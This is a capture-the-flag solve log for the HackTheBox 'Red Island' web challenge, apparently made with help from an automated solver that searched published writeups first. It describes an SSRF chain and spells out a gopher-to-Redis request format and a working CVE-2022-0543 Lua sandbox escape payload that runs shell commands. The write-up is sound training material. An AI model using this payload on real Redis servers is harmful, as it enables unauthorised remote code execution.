# Red Island — SOLVED (assisted: writeup, ~10 min end-to-end)

- Platform: HackTheBox Cyber Apocalypse 2022 (web)
- Date: 2026-09-07
- Flag: `HTB{REDACTED}` (read from /readflag via Redis RCE)
- Artifacts: `~/ctf/challenges/red-island/exploit.py`
- Writeup used: 7Rocky + HTB official blog ("Redis Lua Sandbox Escape RCE with SSRF")
- Note: this was the FIRST run under the new writeup-first discipline — search
  immediately after fingerprint located the exact chain before any fuzzing.

## Chain

1. Fingerprint: Express (X-Powered-By), login/register page, nes.css (HTB style).
2. `tools/writeup_search.py "Red Island HTB"` → instant hit: CA 2022, Redis Lua RCE.
3. Register/login → dashboard "picture url" + Convert = SSRF at
   `POST /api/red/generate {"url": ...}`.
4. SSRF confirms: `http://127.0.0.1:1337/` AND `file:///app/index.js` (content
   echoed back in the 401 `message` field — a perfect read channel).
5. Source read: Node + `connect-redis` session store → Redis on 127.0.0.1:6379.
6. gopher SSRF → raw RESP to Redis:
   `*3\r\n$4\r\neval\r\n$<len>\r\n<LUA>\r\n$1\r\n0\r\n*1\r\n$4\r\nquit\r\n`
   with CVE-2022-0543 payload:
   `local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0','luaopen_io');local io=io_l();local f=io.popen('<cmd>','r');local res=f:read('*a');f:close();return res`
   (length prefix must be exact byte length of the lua string).
7. `ls /` → `/readflag` exists → run it → flag.

## Reusable lessons

- **Writeup-first worked as designed**: fingerprint → search → chain known in
  minutes; zero blind fuzzing this time (compare: nginxatsu spent ~10 wasted rounds).
- **SSRF echo channel**: this app echoes fetched content inside the error
  `message` even on non-200 — always inspect error bodies for leak channels.
- **gopher → Redis RESP**: compute `$N` from exact byte length; url-encode with
  `quote(safe="")`; end with `quit` to close cleanly.
- **CVE-2022-0543** (Debian Redis Lua sandbox escape via `package.loadlib`) —
  standard first try when Redis is reachable via SSRF.
- Name/theme hints matter: "Red Island" = Redis; challenge titles in HTB are
  direct bug-class hints.
